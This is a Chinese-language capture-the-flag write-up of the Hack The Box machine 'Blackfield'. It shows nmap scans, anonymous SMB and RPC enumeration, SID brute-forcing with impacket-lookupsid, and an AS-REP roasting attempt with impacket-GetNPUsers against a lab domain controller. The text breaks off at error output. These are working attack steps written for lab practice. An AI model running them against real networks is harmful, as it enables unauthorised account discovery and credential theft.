---
title: HTB-Blackfield Writeup
date: 2026-04-27T10:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - SMB
  - RPC
  - Impacket
  - lookupsids
  - GetNPUsers
  - BloodHound
  - ForceChangePassword
  - Windows
  - DMP
  - SeBackupPrivilege
  - Securetsdump
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ sudo nmap --min-rate 10000 -p- 10.129.229.17 -oA Nmap/ports
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 22:32 -0400
Nmap scan report for 10.129.229.17
Host is up (0.27s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 21.72 seconds

```

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,88,135,389,445,593,3268,5985

```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ sudo nmap -sT -sC -sV -O -p53,88,135,389,445,593,3268,5985 10.129.229.17
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 22:34 -0400
Nmap scan report for 10.129.229.17
Host is up (0.14s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-27 09:34:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-27T09:35:06
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.81 seconds

```

根据扫描出来的端口可以判断这是一台域控制器，开放 winrm、LDAP、SMB 服务。

将暴露出来的域名解析到 `hosts`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ sudo bash -c 'echo "10.129.229.17 BLACKFIELD.local" >> /etc/hosts'
[sudo] password for kali: 
                                                                                                         
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ tail -n 1 /etc/hosts
10.129.229.17 BLACKFIELD.local
```

## SMB 探索

执行 smbclient 进行匿名枚举。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ smbclient -L 10.129.229.17 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.229.17 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

```

发现了许多共享目录，其中 `forensic` 和 `profiles$` 可能有有价值的信息。

## RPC 探索

执行 rpcclient 使用 空用户尝试链接。

其中大部分命令均无权限，`lsquery` 可以查询到 sid。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ rpcclient -U '' -N 10.129.229.17 
rpcclient $> srvinfo
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> getdompwinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> lsaquery
Domain Name: BLACKFIELD
Domain Sid: S-1-5-21-4194615774-2175524697-3563712290
```

执行 lookupsid 发现用户名。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ impacket-lookupsid anonymous@10.129.229.17 20000 | tee Lookupsid_result.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.229.17
[*] StringBinding ncacn_np:10.129.229.17[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4194615774-2175524697-3563712290
498: BLACKFIELD\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: BLACKFIELD\Administrator (SidTypeUser)
501: BLACKFIELD\Guest (SidTypeUser)
502: BLACKFIELD\krbtgt (SidTypeUser)
512: BLACKFIELD\Domain Admins (SidTypeGroup)
513: BLACKFIELD\Domain Users (SidTypeGroup)
514: BLACKFIELD\Domain Guests (SidTypeGroup)
515: BLACKFIELD\Domain Computers (SidTypeGroup)
516: BLACKFIELD\Domain Controllers (SidTypeGroup)
517: BLACKFIELD\Cert Publishers (SidTypeAlias)
518: BLACKFIELD\Schema Admins (SidTypeGroup)
519: BLACKFIELD\Enterprise Admins (SidTypeGroup)
520: BLACKFIELD\Group Policy Creator Owners (SidTypeGroup)
521: BLACKFIELD\Read-only Domain Controllers (SidTypeGroup)
522: BLACKFIELD\Cloneable Domain Controllers (SidTypeGroup)
525: BLACKFIELD\Protected Users (SidTypeGroup)
526: BLACKFIELD\Key Admins (SidTypeGroup)
527: BLACKFIELD\Enterprise Key Admins (SidTypeGroup)
553: BLACKFIELD\RAS and IAS Servers (SidTypeAlias)
571: BLACKFIELD\Allowed RODC Password Replication Group (SidTypeAlias)
572: BLACKFIELD\Denied RODC Password Replication Group (SidTypeAlias)
1000: BLACKFIELD\DC01$ (SidTypeUser)
1101: BLACKFIELD\DnsAdmins (SidTypeAlias)
1102: BLACKFIELD\DnsUpdateProxy (SidTypeGroup)
1103: BLACKFIELD\audit2020 (SidTypeUser)
1104: BLACKFIELD\support (SidTypeUser)
1105: BLACKFIELD\BLACKFIELD764430 (SidTypeUser)
1106: BLACKFIELD\BLACKFIELD538365 (SidTypeUser)
1107: BLACKFIELD\BLACKFIELD189208 (SidTypeUser)
1108: BLACKFIELD\BLACKFIELD404458 (SidTypeUser)
1109: BLACKFIELD\BLACKFIELD706381 (SidTypeUser)
1110: BLACKFIELD\BLACKFIELD937395 (SidTypeUser)
1111: BLACKFIELD\BLACKFIELD553715 (SidTypeUser)
1112: BLACKFIELD\BLACKFIELD840481 (SidTypeUser)
1113: BLACKFIELD\BLACKFIELD622501 (SidTypeUser)
1114: BLACKFIELD\BLACKFIELD787464 (SidTypeUser)
1115: BLACKFIELD\BLACKFIELD163183 (SidTypeUser)
1116: BLACKFIELD\BLACKFIELD869335 (SidTypeUser)
1117: BLACKFIELD\BLACKFIELD319016 (SidTypeUser)
1118: BLACKFIELD\BLACKFIELD600999 (SidTypeUser)
1119: BLACKFIELD\BLACKFIELD894905 (SidTypeUser)
1120: BLACKFIELD\BLACKFIELD253541 (SidTypeUser)
1121: BLACKFIELD\BLACKFIELD175204 (SidTypeUser)
1122: BLACKFIELD\BLACKFIELD727512 (SidTypeUser)
1123: BLACKFIELD\BLACKFIELD227380 (SidTypeUser)
1124: BLACKFIELD\BLACKFIELD251003 (SidTypeUser)
1125: BLACKFIELD\BLACKFIELD129328 (SidTypeUser)
1126: BLACKFIELD\BLACKFIELD616527 (SidTypeUser)
1127: BLACKFIELD\BLACKFIELD533551 (SidTypeUser)
1128: BLACKFIELD\BLACKFIELD883784 (SidTypeUser)
1129: BLACKFIELD\BLACKFIELD908329 (SidTypeUser)
1130: BLACKFIELD\BLACKFIELD601590 (SidTypeUser)
1131: BLACKFIELD\BLACKFIELD573498 (SidTypeUser)
1132: BLACKFIELD\BLACKFIELD290325 (SidTypeUser)
1133: BLACKFIELD\BLACKFIELD775986 (SidTypeUser)
1134: BLACKFIELD\BLACKFIELD348433 (SidTypeUser)
1135: BLACKFIELD\BLACKFIELD196444 (SidTypeUser)
1136: BLACKFIELD\BLACKFIELD137694 (SidTypeUser)
1137: BLACKFIELD\BLACKFIELD533886 (SidTypeUser)
1138: BLACKFIELD\BLACKFIELD268320 (SidTypeUser)
1139: BLACKFIELD\BLACKFIELD909590 (SidTypeUser)
1140: BLACKFIELD\BLACKFIELD136813 (SidTypeUser)
1141: BLACKFIELD\BLACKFIELD358090 (SidTypeUser)
1142: BLACKFIELD\BLACKFIELD561870 (SidTypeUser)
1143: BLACKFIELD\BLACKFIELD269538 (SidTypeUser)
1144: BLACKFIELD\BLACKFIELD169035 (SidTypeUser)
1145: BLACKFIELD\BLACKFIELD118321 (SidTypeUser)
1146: BLACKFIELD\BLACKFIELD592556 (SidTypeUser)
1147: BLACKFIELD\BLACKFIELD618519 (SidTypeUser)
1148: BLACKFIELD\BLACKFIELD329802 (SidTypeUser)
1149: BLACKFIELD\BLACKFIELD753480 (SidTypeUser)
1150: BLACKFIELD\BLACKFIELD837541 (SidTypeUser)
1151: BLACKFIELD\BLACKFIELD186980 (SidTypeUser)
1152: BLACKFIELD\BLACKFIELD419600 (SidTypeUser)
1153: BLACKFIELD\BLACKFIELD220786 (SidTypeUser)
1154: BLACKFIELD\BLACKFIELD767820 (SidTypeUser)
1155: BLACKFIELD\BLACKFIELD549571 (SidTypeUser)
1156: BLACKFIELD\BLACKFIELD411740 (SidTypeUser)
1157: BLACKFIELD\BLACKFIELD768095 (SidTypeUser)
1158: BLACKFIELD\BLACKFIELD835725 (SidTypeUser)
1159: BLACKFIELD\BLACKFIELD251977 (SidTypeUser)
1160: BLACKFIELD\BLACKFIELD430864 (SidTypeUser)
1161: BLACKFIELD\BLACKFIELD413242 (SidTypeUser)
1162: BLACKFIELD\BLACKFIELD464763 (SidTypeUser)
1163: BLACKFIELD\BLACKFIELD266096 (SidTypeUser)
1164: BLACKFIELD\BLACKFIELD334058 (SidTypeUser)
1165: BLACKFIELD\BLACKFIELD404213 (SidTypeUser)
1166: BLACKFIELD\BLACKFIELD219324 (SidTypeUser)
1167: BLACKFIELD\BLACKFIELD412798 (SidTypeUser)
1168: BLACKFIELD\BLACKFIELD441593 (SidTypeUser)
1169: BLACKFIELD\BLACKFIELD606328 (SidTypeUser)
1170: BLACKFIELD\BLACKFIELD796301 (SidTypeUser)
1171: BLACKFIELD\BLACKFIELD415829 (SidTypeUser)
1172: BLACKFIELD\BLACKFIELD820995 (SidTypeUser)
1173: BLACKFIELD\BLACKFIELD695166 (SidTypeUser)
1174: BLACKFIELD\BLACKFIELD759042 (SidTypeUser)
1175: BLACKFIELD\BLACKFIELD607290 (SidTypeUser)
1176: BLACKFIELD\BLACKFIELD229506 (SidTypeUser)
1177: BLACKFIELD\BLACKFIELD256791 (SidTypeUser)
1178: BLACKFIELD\BLACKFIELD997545 (SidTypeUser)
1179: BLACKFIELD\BLACKFIELD114762 (SidTypeUser)
1180: BLACKFIELD\BLACKFIELD321206 (SidTypeUser)
1181: BLACKFIELD\BLACKFIELD195757 (SidTypeUser)
1182: BLACKFIELD\BLACKFIELD877328 (SidTypeUser)
1183: BLACKFIELD\BLACKFIELD446463 (SidTypeUser)
1184: BLACKFIELD\BLACKFIELD579980 (SidTypeUser)
1185: BLACKFIELD\BLACKFIELD775126 (SidTypeUser)
1186: BLACKFIELD\BLACKFIELD429587 (SidTypeUser)
1187: BLACKFIELD\BLACKFIELD534956 (SidTypeUser)
1188: BLACKFIELD\BLACKFIELD315276 (SidTypeUser)
1189: BLACKFIELD\BLACKFIELD995218 (SidTypeUser)
1190: BLACKFIELD\BLACKFIELD843883 (SidTypeUser)
1191: BLACKFIELD\BLACKFIELD876916 (SidTypeUser)
1192: BLACKFIELD\BLACKFIELD382769 (SidTypeUser)
1193: BLACKFIELD\BLACKFIELD194732 (SidTypeUser)
1194: BLACKFIELD\BLACKFIELD191416 (SidTypeUser)
1195: BLACKFIELD\BLACKFIELD932709 (SidTypeUser)
1196: BLACKFIELD\BLACKFIELD546640 (SidTypeUser)
1197: BLACKFIELD\BLACKFIELD569313 (SidTypeUser)
1198: BLACKFIELD\BLACKFIELD744790 (SidTypeUser)
1199: BLACKFIELD\BLACKFIELD739659 (SidTypeUser)
1200: BLACKFIELD\BLACKFIELD926559 (SidTypeUser)
1201: BLACKFIELD\BLACKFIELD969352 (SidTypeUser)
1202: BLACKFIELD\BLACKFIELD253047 (SidTypeUser)
1203: BLACKFIELD\BLACKFIELD899433 (SidTypeUser)
1204: BLACKFIELD\BLACKFIELD606964 (SidTypeUser)
1205: BLACKFIELD\BLACKFIELD385719 (SidTypeUser)
1206: BLACKFIELD\BLACKFIELD838710 (SidTypeUser)
1207: BLACKFIELD\BLACKFIELD608914 (SidTypeUser)
1208: BLACKFIELD\BLACKFIELD569653 (SidTypeUser)
1209: BLACKFIELD\BLACKFIELD759079 (SidTypeUser)
1210: BLACKFIELD\BLACKFIELD488531 (SidTypeUser)
1211: BLACKFIELD\BLACKFIELD160610 (SidTypeUser)
1212: BLACKFIELD\BLACKFIELD586934 (SidTypeUser)
1213: BLACKFIELD\BLACKFIELD819822 (SidTypeUser)
1214: BLACKFIELD\BLACKFIELD739765 (SidTypeUser)
1215: BLACKFIELD\BLACKFIELD875008 (SidTypeUser)
1216: BLACKFIELD\BLACKFIELD441759 (SidTypeUser)
1217: BLACKFIELD\BLACKFIELD763893 (SidTypeUser)
1218: BLACKFIELD\BLACKFIELD713470 (SidTypeUser)
1219: BLACKFIELD\BLACKFIELD131771 (SidTypeUser)
1220: BLACKFIELD\BLACKFIELD793029 (SidTypeUser)
1221: BLACKFIELD\BLACKFIELD694429 (SidTypeUser)
1222: BLACKFIELD\BLACKFIELD802251 (SidTypeUser)
1223: BLACKFIELD\BLACKFIELD602567 (SidTypeUser)
1224: BLACKFIELD\BLACKFIELD328983 (SidTypeUser)
1225: BLACKFIELD\BLACKFIELD990638 (SidTypeUser)
1226: BLACKFIELD\BLACKFIELD350809 (SidTypeUser)
1227: BLACKFIELD\BLACKFIELD405242 (SidTypeUser)
1228: BLACKFIELD\BLACKFIELD267457 (SidTypeUser)
1229: BLACKFIELD\BLACKFIELD686428 (SidTypeUser)
1230: BLACKFIELD\BLACKFIELD478828 (SidTypeUser)
1231: BLACKFIELD\BLACKFIELD129387 (SidTypeUser)
1232: BLACKFIELD\BLACKFIELD544934 (SidTypeUser)
1233: BLACKFIELD\BLACKFIELD115148 (SidTypeUser)
1234: BLACKFIELD\BLACKFIELD753537 (SidTypeUser)
1235: BLACKFIELD\BLACKFIELD416532 (SidTypeUser)
1236: BLACKFIELD\BLACKFIELD680939 (SidTypeUser)
1237: BLACKFIELD\BLACKFIELD732035 (SidTypeUser)
1238: BLACKFIELD\BLACKFIELD522135 (SidTypeUser)
1239: BLACKFIELD\BLACKFIELD773423 (SidTypeUser)
1240: BLACKFIELD\BLACKFIELD371669 (SidTypeUser)
1241: BLACKFIELD\BLACKFIELD252379 (SidTypeUser)
1242: BLACKFIELD\BLACKFIELD828826 (SidTypeUser)
1243: BLACKFIELD\BLACKFIELD548394 (SidTypeUser)
1244: BLACKFIELD\BLACKFIELD611993 (SidTypeUser)
1245: BLACKFIELD\BLACKFIELD192642 (SidTypeUser)
1246: BLACKFIELD\BLACKFIELD106360 (SidTypeUser)
1247: BLACKFIELD\BLACKFIELD939243 (SidTypeUser)
1248: BLACKFIELD\BLACKFIELD230515 (SidTypeUser)
1249: BLACKFIELD\BLACKFIELD774376 (SidTypeUser)
1250: BLACKFIELD\BLACKFIELD576233 (SidTypeUser)
1251: BLACKFIELD\BLACKFIELD676303 (SidTypeUser)
1252: BLACKFIELD\BLACKFIELD673073 (SidTypeUser)
1253: BLACKFIELD\BLACKFIELD558867 (SidTypeUser)
1254: BLACKFIELD\BLACKFIELD184482 (SidTypeUser)
1255: BLACKFIELD\BLACKFIELD724669 (SidTypeUser)
1256: BLACKFIELD\BLACKFIELD765350 (SidTypeUser)
1257: BLACKFIELD\BLACKFIELD411132 (SidTypeUser)
1258: BLACKFIELD\BLACKFIELD128775 (SidTypeUser)
1259: BLACKFIELD\BLACKFIELD704154 (SidTypeUser)
1260: BLACKFIELD\BLACKFIELD107197 (SidTypeUser)
1261: BLACKFIELD\BLACKFIELD994577 (SidTypeUser)
1262: BLACKFIELD\BLACKFIELD683323 (SidTypeUser)
1263: BLACKFIELD\BLACKFIELD433476 (SidTypeUser)
1264: BLACKFIELD\BLACKFIELD644281 (SidTypeUser)
1265: BLACKFIELD\BLACKFIELD195953 (SidTypeUser)
1266: BLACKFIELD\BLACKFIELD868068 (SidTypeUser)
1267: BLACKFIELD\BLACKFIELD690642 (SidTypeUser)
1268: BLACKFIELD\BLACKFIELD465267 (SidTypeUser)
1269: BLACKFIELD\BLACKFIELD199889 (SidTypeUser)
1270: BLACKFIELD\BLACKFIELD468839 (SidTypeUser)
1271: BLACKFIELD\BLACKFIELD348835 (SidTypeUser)
1272: BLACKFIELD\BLACKFIELD624385 (SidTypeUser)
1273: BLACKFIELD\BLACKFIELD818863 (SidTypeUser)
1274: BLACKFIELD\BLACKFIELD939200 (SidTypeUser)
1275: BLACKFIELD\BLACKFIELD135990 (SidTypeUser)
1276: BLACKFIELD\BLACKFIELD484290 (SidTypeUser)
1277: BLACKFIELD\BLACKFIELD898237 (SidTypeUser)
1278: BLACKFIELD\BLACKFIELD773118 (SidTypeUser)
1279: BLACKFIELD\BLACKFIELD148067 (SidTypeUser)
1280: BLACKFIELD\BLACKFIELD390179 (SidTypeUser)
1281: BLACKFIELD\BLACKFIELD359278 (SidTypeUser)
1282: BLACKFIELD\BLACKFIELD375924 (SidTypeUser)
1283: BLACKFIELD\BLACKFIELD533060 (SidTypeUser)
1284: BLACKFIELD\BLACKFIELD534196 (SidTypeUser)
1285: BLACKFIELD\BLACKFIELD639103 (SidTypeUser)
1286: BLACKFIELD\BLACKFIELD933887 (SidTypeUser)
1287: BLACKFIELD\BLACKFIELD907614 (SidTypeUser)
1288: BLACKFIELD\BLACKFIELD991588 (SidTypeUser)
1289: BLACKFIELD\BLACKFIELD781404 (SidTypeUser)
1290: BLACKFIELD\BLACKFIELD787995 (SidTypeUser)
1291: BLACKFIELD\BLACKFIELD911926 (SidTypeUser)
1292: BLACKFIELD\BLACKFIELD146200 (SidTypeUser)
1293: BLACKFIELD\BLACKFIELD826622 (SidTypeUser)
1294: BLACKFIELD\BLACKFIELD171624 (SidTypeUser)
1295: BLACKFIELD\BLACKFIELD497216 (SidTypeUser)
1296: BLACKFIELD\BLACKFIELD839613 (SidTypeUser)
1297: BLACKFIELD\BLACKFIELD428532 (SidTypeUser)
1298: BLACKFIELD\BLACKFIELD697473 (SidTypeUser)
1299: BLACKFIELD\BLACKFIELD291678 (SidTypeUser)
1300: BLACKFIELD\BLACKFIELD623122 (SidTypeUser)
1301: BLACKFIELD\BLACKFIELD765982 (SidTypeUser)
1302: BLACKFIELD\BLACKFIELD701303 (SidTypeUser)
1303: BLACKFIELD\BLACKFIELD250576 (SidTypeUser)
1304: BLACKFIELD\BLACKFIELD971417 (SidTypeUser)
1305: BLACKFIELD\BLACKFIELD160820 (SidTypeUser)
1306: BLACKFIELD\BLACKFIELD385928 (SidTypeUser)
1307: BLACKFIELD\BLACKFIELD848660 (SidTypeUser)
1308: BLACKFIELD\BLACKFIELD682842 (SidTypeUser)
1309: BLACKFIELD\BLACKFIELD813266 (SidTypeUser)
1310: BLACKFIELD\BLACKFIELD274577 (SidTypeUser)
1311: BLACKFIELD\BLACKFIELD448641 (SidTypeUser)
1312: BLACKFIELD\BLACKFIELD318077 (SidTypeUser)
1313: BLACKFIELD\BLACKFIELD289513 (SidTypeUser)
1314: BLACKFIELD\BLACKFIELD336573 (SidTypeUser)
1315: BLACKFIELD\BLACKFIELD962495 (SidTypeUser)
1316: BLACKFIELD\BLACKFIELD566117 (SidTypeUser)
1317: BLACKFIELD\BLACKFIELD617630 (SidTypeUser)
1318: BLACKFIELD\BLACKFIELD717683 (SidTypeUser)
1319: BLACKFIELD\BLACKFIELD390192 (SidTypeUser)
1320: BLACKFIELD\BLACKFIELD652779 (SidTypeUser)
1321: BLACKFIELD\BLACKFIELD665997 (SidTypeUser)
1322: BLACKFIELD\BLACKFIELD998321 (SidTypeUser)
1323: BLACKFIELD\BLACKFIELD946509 (SidTypeUser)
1324: BLACKFIELD\BLACKFIELD228442 (SidTypeUser)
1325: BLACKFIELD\BLACKFIELD548464 (SidTypeUser)
1326: BLACKFIELD\BLACKFIELD586592 (SidTypeUser)
1327: BLACKFIELD\BLACKFIELD512331 (SidTypeUser)
1328: BLACKFIELD\BLACKFIELD609423 (SidTypeUser)
1329: BLACKFIELD\BLACKFIELD395725 (SidTypeUser)
1330: BLACKFIELD\BLACKFIELD438923 (SidTypeUser)
1331: BLACKFIELD\BLACKFIELD691480 (SidTypeUser)
1332: BLACKFIELD\BLACKFIELD236467 (SidTypeUser)
1333: BLACKFIELD\BLACKFIELD895235 (SidTypeUser)
1334: BLACKFIELD\BLACKFIELD788523 (SidTypeUser)
1335: BLACKFIELD\BLACKFIELD710285 (SidTypeUser)
1336: BLACKFIELD\BLACKFIELD357023 (SidTypeUser)
1337: BLACKFIELD\BLACKFIELD362337 (SidTypeUser)
1338: BLACKFIELD\BLACKFIELD651599 (SidTypeUser)
1339: BLACKFIELD\BLACKFIELD579344 (SidTypeUser)
1340: BLACKFIELD\BLACKFIELD859776 (SidTypeUser)
1341: BLACKFIELD\BLACKFIELD789969 (SidTypeUser)
1342: BLACKFIELD\BLACKFIELD356727 (SidTypeUser)
1343: BLACKFIELD\BLACKFIELD962999 (SidTypeUser)
1344: BLACKFIELD\BLACKFIELD201655 (SidTypeUser)
1345: BLACKFIELD\BLACKFIELD635996 (SidTypeUser)
1346: BLACKFIELD\BLACKFIELD478410 (SidTypeUser)
1347: BLACKFIELD\BLACKFIELD518316 (SidTypeUser)
1348: BLACKFIELD\BLACKFIELD202900 (SidTypeUser)
1349: BLACKFIELD\BLACKFIELD767498 (SidTypeUser)
1350: BLACKFIELD\BLACKFIELD103974 (SidTypeUser)
1351: BLACKFIELD\BLACKFIELD135403 (SidTypeUser)
1352: BLACKFIELD\BLACKFIELD112766 (SidTypeUser)
1353: BLACKFIELD\BLACKFIELD978938 (SidTypeUser)
1354: BLACKFIELD\BLACKFIELD871753 (SidTypeUser)
1355: BLACKFIELD\BLACKFIELD136203 (SidTypeUser)
1356: BLACKFIELD\BLACKFIELD634593 (SidTypeUser)
1357: BLACKFIELD\BLACKFIELD274367 (SidTypeUser)
1358: BLACKFIELD\BLACKFIELD520852 (SidTypeUser)
1359: BLACKFIELD\BLACKFIELD339143 (SidTypeUser)
1360: BLACKFIELD\BLACKFIELD684814 (SidTypeUser)
1361: BLACKFIELD\BLACKFIELD792484 (SidTypeUser)
1362: BLACKFIELD\BLACKFIELD802875 (SidTypeUser)
1363: BLACKFIELD\BLACKFIELD383108 (SidTypeUser)
1364: BLACKFIELD\BLACKFIELD318250 (SidTypeUser)
1365: BLACKFIELD\BLACKFIELD496547 (SidTypeUser)
1366: BLACKFIELD\BLACKFIELD219914 (SidTypeUser)
1367: BLACKFIELD\BLACKFIELD454313 (SidTypeUser)
1368: BLACKFIELD\BLACKFIELD460131 (SidTypeUser)
1369: BLACKFIELD\BLACKFIELD613771 (SidTypeUser)
1370: BLACKFIELD\BLACKFIELD632329 (SidTypeUser)
1371: BLACKFIELD\BLACKFIELD402639 (SidTypeUser)
1372: BLACKFIELD\BLACKFIELD235930 (SidTypeUser)
1373: BLACKFIELD\BLACKFIELD246388 (SidTypeUser)
1374: BLACKFIELD\BLACKFIELD946435 (SidTypeUser)
1375: BLACKFIELD\BLACKFIELD739227 (SidTypeUser)
1376: BLACKFIELD\BLACKFIELD827906 (SidTypeUser)
1377: BLACKFIELD\BLACKFIELD198927 (SidTypeUser)
1378: BLACKFIELD\BLACKFIELD169876 (SidTypeUser)
1379: BLACKFIELD\BLACKFIELD150357 (SidTypeUser)
1380: BLACKFIELD\BLACKFIELD594619 (SidTypeUser)
1381: BLACKFIELD\BLACKFIELD274109 (SidTypeUser)
1382: BLACKFIELD\BLACKFIELD682949 (SidTypeUser)
1383: BLACKFIELD\BLACKFIELD316850 (SidTypeUser)
1384: BLACKFIELD\BLACKFIELD884808 (SidTypeUser)
1385: BLACKFIELD\BLACKFIELD327610 (SidTypeUser)
1386: BLACKFIELD\BLACKFIELD899238 (SidTypeUser)
1387: BLACKFIELD\BLACKFIELD184493 (SidTypeUser)
1388: BLACKFIELD\BLACKFIELD631162 (SidTypeUser)
1389: BLACKFIELD\BLACKFIELD591846 (SidTypeUser)
1390: BLACKFIELD\BLACKFIELD896715 (SidTypeUser)
1391: BLACKFIELD\BLACKFIELD500073 (SidTypeUser)
1392: BLACKFIELD\BLACKFIELD584113 (SidTypeUser)
1393: BLACKFIELD\BLACKFIELD204805 (SidTypeUser)
1394: BLACKFIELD\BLACKFIELD842593 (SidTypeUser)
1395: BLACKFIELD\BLACKFIELD397679 (SidTypeUser)
1396: BLACKFIELD\BLACKFIELD842438 (SidTypeUser)
1397: BLACKFIELD\BLACKFIELD286615 (SidTypeUser)
1398: BLACKFIELD\BLACKFIELD224839 (SidTypeUser)
1399: BLACKFIELD\BLACKFIELD631599 (SidTypeUser)
1400: BLACKFIELD\BLACKFIELD247450 (SidTypeUser)
1401: BLACKFIELD\BLACKFIELD290582 (SidTypeUser)
1402: BLACKFIELD\BLACKFIELD657263 (SidTypeUser)
1403: BLACKFIELD\BLACKFIELD314351 (SidTypeUser)
1404: BLACKFIELD\BLACKFIELD434395 (SidTypeUser)
1405: BLACKFIELD\BLACKFIELD410243 (SidTypeUser)
1406: BLACKFIELD\BLACKFIELD307633 (SidTypeUser)
1407: BLACKFIELD\BLACKFIELD758945 (SidTypeUser)
1408: BLACKFIELD\BLACKFIELD541148 (SidTypeUser)
1409: BLACKFIELD\BLACKFIELD532412 (SidTypeUser)
1410: BLACKFIELD\BLACKFIELD996878 (SidTypeUser)
1411: BLACKFIELD\BLACKFIELD653097 (SidTypeUser)
1412: BLACKFIELD\BLACKFIELD438814 (SidTypeUser)
1413: BLACKFIELD\svc_backup (SidTypeUser)
1414: BLACKFIELD\lydericlefebvre (SidTypeUser)
1415: BLACKFIELD\PC01$ (SidTypeUser)
1416: BLACKFIELD\PC02$ (SidTypeUser)
1417: BLACKFIELD\PC03$ (SidTypeUser)
1418: BLACKFIELD\PC04$ (SidTypeUser)
1419: BLACKFIELD\PC05$ (SidTypeUser)
1420: BLACKFIELD\PC06$ (SidTypeUser)
1421: BLACKFIELD\PC07$ (SidTypeUser)
1422: BLACKFIELD\PC08$ (SidTypeUser)
1423: BLACKFIELD\PC09$ (SidTypeUser)
1424: BLACKFIELD\PC10$ (SidTypeUser)
1425: BLACKFIELD\PC11$ (SidTypeUser)
1426: BLACKFIELD\PC12$ (SidTypeUser)
1427: BLACKFIELD\PC13$ (SidTypeUser)
1428: BLACKFIELD\SRV-WEB$ (SidTypeUser)
1429: BLACKFIELD\SRV-FILE$ (SidTypeUser)
1430: BLACKFIELD\SRV-EXCHANGE$ (SidTypeUser)
1431: BLACKFIELD\SRV-INTRANET$ (SidTypeUser)

```

提取用户名构建一个 `users` 字典。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ grep SidType Lookupsid_result.txt | awk -F '\' '{print $2}' | awk -F '(' '{print $1}'  | tee Directory/users.txt
Enterprise Read-only Domain Controllers 
Administrator 
Guest 
krbtgt 
Domain Admins 
Domain Users 
Domain Guests 
Domain Computers 
Domain Controllers 
Cert Publishers 
Schema Admins 
Enterprise Admins 
Group Policy Creator Owners 
Read-only Domain Controllers 
Cloneable Domain Controllers 
Protected Users 
Key Admins 
Enterprise Key Admins 
RAS and IAS Servers 
Allowed RODC Password Replication Group 
Denied RODC Password Replication Group 
DC01$ 
DnsAdmins 
DnsUpdateProxy 
...
...
```

执行 GetNPUsers 获取 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]                                                                                                                                                                          
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.129.229.17 BLACKFIELD.local/ -usersfile Directory/users.txt                                                                                                            
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                        
                                                                                                                                                                                                                  
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                                                                   
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                                                                           
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)                                                                                                                          
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
